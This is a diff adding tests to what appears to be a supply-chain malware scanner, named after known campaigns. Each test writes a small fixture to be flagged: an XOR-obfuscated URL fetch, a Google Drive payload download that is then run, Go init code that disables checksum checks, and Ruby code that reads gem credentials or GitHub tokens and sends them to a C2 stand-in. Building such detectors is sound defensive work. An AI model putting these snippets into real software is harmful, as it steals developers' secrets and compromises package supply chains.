@@ -3317,3 +3317,161 @@ def test_obfuscation_feedfacf_not_in_normal_comment(tmp_path):
     )
     _, _, _, _, _, _, _, obfuscated, *_ = _build_diff(old, new)
     assert obfuscated is False
+
+
+# ── Coruna art-template: per-char XOR array string obfuscation ───────────────
+
+
+def test_obfuscation_xor_char_array_arrow_detected(tmp_path):
+    """Array .map(x => String.fromCharCode(x ^ N)).join('') in JS flags XOR string obfuscation."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/config.js": (
+                "const url = [118,113,104,124,115].map(x => String.fromCharCode(x ^ 67)).join('');\n"
+                "fetch(url);\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, obfuscated, *_ = _build_diff(old, new)
+    assert obfuscated is True
+
+
+def test_obfuscation_xor_char_array_not_in_py(tmp_path):
+    """XOR char array pattern in a .py file (not in _OBFUSCATION_PATTERNS) is not flagged as obfuscated."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "script.py": (
+                "url = ''.join(chr(x ^ 67) for x in [118,113,104,124,115])\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, obfuscated, *_ = _build_diff(old, new)
+    assert obfuscated is False
+
+
+# ── Contagious Interview: Google Drive CDN payload delivery ──────────────────
+
+
+def test_net_calls_google_drive_usercontent_js(tmp_path):
+    """drive.usercontent.google.com/download in JS triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"index.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "index.js": (
+                "// nothing\n"
+                "const payloadUrl = 'https://drive.usercontent.google.com/download?id=ABCDEF&export=download';\n"
+                "fetch(payloadUrl).then(r => r.arrayBuffer()).then(run);\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_google_drive_uc_py(tmp_path):
+    """drive.google.com/uc?export=download in Python library code triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"mypackage/downloader.py": "# nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "mypackage/downloader.py": (
+                "# nothing\n"
+                "import urllib.request\n"
+                "urllib.request.urlretrieve('https://drive.google.com/uc?id=XYZ&export=download', 'payload.zip')\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+# ── BufferZoneCorp: Go module env poisoning ──────────────────────────────────
+
+
+def test_net_calls_go_goflags_setenv(tmp_path):
+    """os.Setenv(\"GOFLAGS\") in Go triggers network_calls_in_lib (unsafe module resolution)."""
+    old = _write_files(tmp_path / "old", {"main.go": "package main\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "main.go": (
+                'package main\nimport "os"\n'
+                'func init() { os.Setenv("GOFLAGS", "-mod=mod") }\n'
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_go_gonosumdb_setenv(tmp_path):
+    """os.Setenv(\"GONOSUMDB\") in Go triggers network_calls_in_lib (checksum bypass)."""
+    old = _write_files(tmp_path / "old", {"main.go": "package main\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "main.go": (
+                'package main\nimport "os"\n'
+                'func init() { os.Setenv("GONOSUMDB", "*") }\n'
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_go_gomodcache_setenv(tmp_path):
+    """os.Setenv(\"GOMODCACHE\") in Go triggers network_calls_in_lib (cache redirect)."""
+    old = _write_files(tmp_path / "old", {"main.go": "package main\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "main.go": (
+                'package main\nimport "os"\n'
+                'func init() { os.Setenv("GOMODCACHE", "/tmp/.gomod-cache") }\n'
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+# ── BufferZoneCorp: Ruby credential file theft ───────────────────────────────
+
+
+def test_net_calls_rb_gem_credentials_detected(tmp_path):
+    """Reading .gem/credentials in Ruby library code triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"lib/helper.rb": "# nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/helper.rb": (
+                "# nothing\n"
+                "creds = File.read(File.join(Dir.home, '.gem/credentials'))\n"
+                "send_to_c2(creds)\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_rb_gh_hosts_yml_detected(tmp_path):
+    """Reading .config/gh/hosts.yml in Ruby library code triggers network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {"lib/auth.rb": "# nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/auth.rb": (
+                "# nothing\n"
+                "token = YAML.load_file(File.join(Dir.home, '.config/gh/hosts.yml'))\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
